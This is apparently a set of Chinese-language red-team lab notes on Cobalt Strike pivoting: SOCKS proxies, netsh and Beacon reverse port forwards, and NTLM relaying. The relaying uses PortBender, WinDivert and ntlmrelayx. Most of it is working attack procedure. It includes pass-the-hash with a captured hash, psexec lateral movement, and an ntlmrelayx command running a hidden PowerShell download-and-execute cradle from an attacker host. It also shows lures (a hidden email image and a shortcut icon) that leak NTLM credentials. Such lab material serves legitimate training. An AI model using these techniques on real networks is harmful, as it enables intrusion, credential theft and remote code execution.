# SOCKS Proxies

Cobalt Strike起一个socks 4代理

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

在kali可以看到这个代理的端口
```
root@kali:~# ss -lpnt
State            Recv-Q           Send-Q                     Local Address:Port                      Peer Address:Port          Process
LISTEN           0                128                                    .:1080                                 .:*              users:(("java",pid=1296,fd=11))
```


修改proxychains配置文件```/etc/proxychains.conf```，增加socks4代理配置
```
socks4 127.0.0.1 1080
```

# Windows Apps

[Proxifier](https://www.proxifier.com/),windows下的一个流量代理软件

增加一个代理
```
 Profile > Proxy Servers -> Add
```

设置代理规则，可以为指定应用设置指定规则
```
 Profile > Proxification Rules
```


# Browsers

主要是FoxyProxy的配置，选择socks4

# Metasploit

在Cobalt Strike ，选择```View > Proxy Pivots```，点击```Tunnel ```按钮，会出现一行诸如这样的命令：
```
setg Proxies socks4:10.10.5.120:1080
```

粘贴上面的命令在msf上执行，然后msf所有的模块都会走1080代理流量端口

如果要停止sock代理：
```
socks stop
```

或者

```
View > Proxy Pivots > Stop
```

# Reverse Port Forwards

两种方法建立反向端口转发

1. netsh（这个[OSCP](https://github.com/maxzxc0110/hack-study/blob/main/OSCP/%E8%BD%AC%E5%8F%91%E5%92%8C%E9%9A%A7%E9%81%93.md)的教材有介绍）
2. Cobalt Strike里面自带的转发

## netsh

语法
```
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```

参数解释：
```
listenaddress is the IP address to listen on (probably always 0.0.0.0).
listenport is the port to listen on.
connectaddress is the destination IP address.
connectport is the destination port.
protocol to use (always TCP).
```

实例,在dc-2建立10.10.14.55:4444的转发到本地端口4444
```
C:\>hostname
dc-2

C:\>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

在dc-1上访问10.10.17.71:4444
```
PS C:\> hostname
dc-1

PS C:\> Test-NetConnection -ComputerName 10.10.17.71 -Port 4444

ComputerName     : 10.10.17.71
RemoteAddress    : 10.10.17.71
RemotePort       : 4444
InterfaceAlias   : Ethernet
SourceAddress    : 10.10.15.75
TcpTestSucceeded : True
```

建立连接
```
PS C:\Users\Administrator\Desktop> hostname
ad

PS C:\Users\Administrator\Desktop> .\listener.ps1
Listening on port 4444
A client has connected
```

listener.ps1
```
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
  $client = $listener.AcceptTcpClient()
  Write-Host "A client has connected"
  $client.Close()
}
```

拆除代理连接
```
C:\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

关于 netsh 端口转发的注意事项：

1. 不管绑定什么端口，都需要本地管理员权限才能添加和删除它们。
2. 它们是socket到socket的连接，因此无法通过防火墙和 Web 代理等网络设备进行连接。
3. 它们特别适合在机器之间创建中继。


## rportfwd

语法：
```
rportfwd [bind port] [forward host] [forward port]
```


当前dc2无法访问10.10.5.120

```
PS C:\> hostname
dc-2

PS C:\> iwr -Uri http://10.10.5.120/a
iwr : Unable to connect to the remote server
```


在WKSTN-1上，把10.10.5.120:80转发到本地端口8080
```
beacon> rportfwd 8080 10.10.5.120 80
[+] started reverse port forward on 8080 to 10.10.5.120:80
```


查看转发成功
```
beacon> run netstat -anp tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```


现在访问10.10.17.231:8080就是相当于访问10.10.5.120:80
```
PS C:\> iwr -Uri http://10.10.17.231:8080/a

StatusCode        : 200
StatusDescription : OK
Content           : $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAOy9Wa/qSrIu+rzrV8yHLa21xNo
                    1wIAxR9rSNTYY444eTJ1SyRjjBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9EZoRXTvEfqyLz7UKLT863/9g6We7H0T
                    fm...
```


停止转发命令
```
rportfwd stop 8080
```


需要注意：

1. Beacon 的反向端口转发始终将流量通过隧道传输到 Team Server，而 Team Server 将流量发送到其预期机器，所以不应该被用来在单个机器之间转发流量。
2. 流量在 Beacon 的 C2 流量中进行隧道传输，而不是通过单独的套接字，并且也可以通过 P2P 链接工作。
3. 无需成为本地管理员即可在高端口上创建反向端口转发。


## rportfwd_local

Beacon 也有一个rportfwd_local命令。```rportfwd```将流量传输到 Team Server，```rportfwd_local```将传输到运行 Cobalt Strike 客户端的机器。

1. 在kali开启一个python的web服务器

```
root@kali:~# echo "This is a test" > test.txt
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/)
```

2. 在kali开启一个CS的客户端,并且进行流量转发
```
beacon> rportfwd_local 8080 127.0.0.1 8080
[+] started reverse port forward on 8080 to rasta -> 127.0.0.1:8080
```

3. 在另外一台机器上访问wkstn-1:8080，访问到了kali上python开的web服务
```
PS C:\> hostname
wkstn-2

PS C:\> iwr -Uri http://wkstn-1:8080/test.txt

StatusCode : 200
StatusDescription : OK
Content : This is a test
```

4. web服务访问记录
```
root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ...
127.0.0.1 - - [23/Jul/2021 19:24:30] "GET /test.txt HTTP/1.1" 200 -
```

# NTLM Relaying

> 什么是NTLM 中继攻击？
在NTLM中继攻击中，攻击者能够拦截或捕获这种认证流量，并有效地允许他们冒充客户对同一或另一服务进行攻击。 例如，一个客户试图连接到服务A，但攻击者拦截了认证流量并使用它连接到服务B，就像他们是客户一样。


kali通常使用[Responder](https://github.com/lgandx/Responder)和[ntlmrelayx](https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx)做中继攻击。

但是在windows中不能使用以上的方法，因为通常windows不会自带python，以及445端口是系统端口，不能被用户绑定监听。

使用Cobalt Strike完成windows上的中继攻击，需要满足以下条件：

1. 使用[WinDivert](https://reqrypt.org/windivert.html)把445端口的流量转发到本地的高端口，比如8445
2. smb流量被转发到高端口（8445）以后，再利用反向端口转发，使用C2把流量转到 Team Server
3. Team Server（也就是kali）上的工具```ntlmrelayx```将侦听smb流量
4. 需要 SOCKS 代理以允许 ntlmrelayx 将流量发送回目标网络

流程图：

![alt NTLM Relaying](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/overview.png)


把工具WinDivert64.sys上传到中转机器的```C:\Windows\System32\drivers```目录
```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> pwd
[*] Current directory is C:\Windows\system32\drivers

beacon> upload C:\Tools\PortBender\WinDivert64.sys
```



[PortBender](https://github.com/praetorian-inc/PortBender)把445流量转到8445
```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
```

使用rportfwd把8445端口转发到 Team Server的445端口
```
beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445
```

建立代理连接
```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```


在```WKSTN-2```，使用SMB流量访问```WKSTN-1```
```
H:\>hostname
wkstn-2

H:\>whoami
dev\nlamb

H:\>dir \\10.10.17.231\blah
```


PortBender 将记录连接

```
New connection from 10.10.17.132:50332 to 10.10.17.231:445
Disconnect from 10.10.17.132:50332 to 10.10.17.231:445
```


```ntlmrelayx ```将使用[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py)转存hash


![alt NTLM Relaying](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/dump-sam.png)


拿到的ntml可以本地破解，也可以pth
```
beacon> pth .\Administrator b423cdd3ad21718de4490d9344afef72

beacon> jump psexec64 srv-2 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_a3) on srv-2 via Service Control Manager (\\srv-2\ADMIN$\3695e43.exe)
Started service 3695e43 on srv-2
[+] established link to child beacon: 10.10.17.68
```


ntlmrelayx除了dump 哈希以外，还可以执行命令
```
root@kali:~# proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```


停止PortBender命令
```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  PortBender

beacon> jobkill 0
beacon> kill 1240
```

## 触发NTML身份验证的其他方法

1. 发送邮件时的图片链接
```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

2. windows快捷方式

一个Windows快捷方式可以有多个属性，包括目标、工作目录和一个图标。 创建一个图标属性指向UNC路径的快捷方式，当它在资源管理器中被查看时，将触发NTLM认证尝试（甚至不需要点击）。

创建快捷方式的最简单方法是使用PowerShell
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```